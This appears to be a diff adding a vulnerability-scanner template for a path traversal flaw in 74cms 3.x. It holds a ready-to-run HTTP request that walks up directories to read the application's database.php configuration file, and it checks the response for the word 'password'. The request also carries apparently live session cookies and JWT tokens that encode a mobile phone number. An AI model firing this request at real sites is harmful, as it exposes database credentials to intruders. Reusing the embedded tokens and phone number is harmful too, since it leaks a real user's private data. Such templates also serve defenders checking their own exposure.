@@ -1,0 +1,31 @@
+id: 74cms-3x-download-index-file-read
+
+info:
+  name: "74cms 3.x 商用版 download index 接口路径遍历漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    74cms 3.x 商用版中 download index 接口存在路径遍历风险，攻击者可通过构造恶意请求读取非授权文件内容。该缺陷源于文件访问逻辑未正确校验路径参数，可能暴露系统敏感信息。
+      
+  tags: 74cms
+
+http:
+- raw:
+  - |
+    GET /index.php/index/download/index?url=..\\..\\application\\database.php HTTP/1.1
+    Host: {{Hostname}}
+    Cookie: Hm_lvt_cbcae2ef192309b577e620c2c493b386=1763466810; HMACCOUNT=73EF44E77A00B368; Hm_lpvt_cbcae2ef192309b577e620c2c493b386=1763468506; qscms_subsiteid=1; qscms_visitor=%7B%22utype%22%3A1%2C%22mobile%22%3A%2218879094501%22%2C%22token%22%3A%22eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3NjM0NzA1MzQsImV4cCI6MTc5NDY4MjUzNCwiaW5mbyI6eyJ1aWQiOjE1NzU5MiwidXR5cGUiOjEsIm1vYmlsZSI6IjE4ODc5MDk0NTAxIn19.4Z4U6FNiq-q7u-gEneXLf9TNfVA3Akfb1NAaVErVDDQ%22%7D
+    Accept: application/json, text/plain, */*
+    User-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3NjM0NzA1MzUsImV4cCI6MTc5NDY4MjUzNSwiaW5mbyI6eyJ1aWQiOjE1NzU5MiwidXR5cGUiOjEsIm1vYmlsZSI6IjE4ODc5MDk0NTAxIn19.gHn5x-DuIixIiaVUjt7jsqoPq4oIh-8sKDigKdFEfVA
+    Platform: web
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+    Connection: keep-alive
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'password'
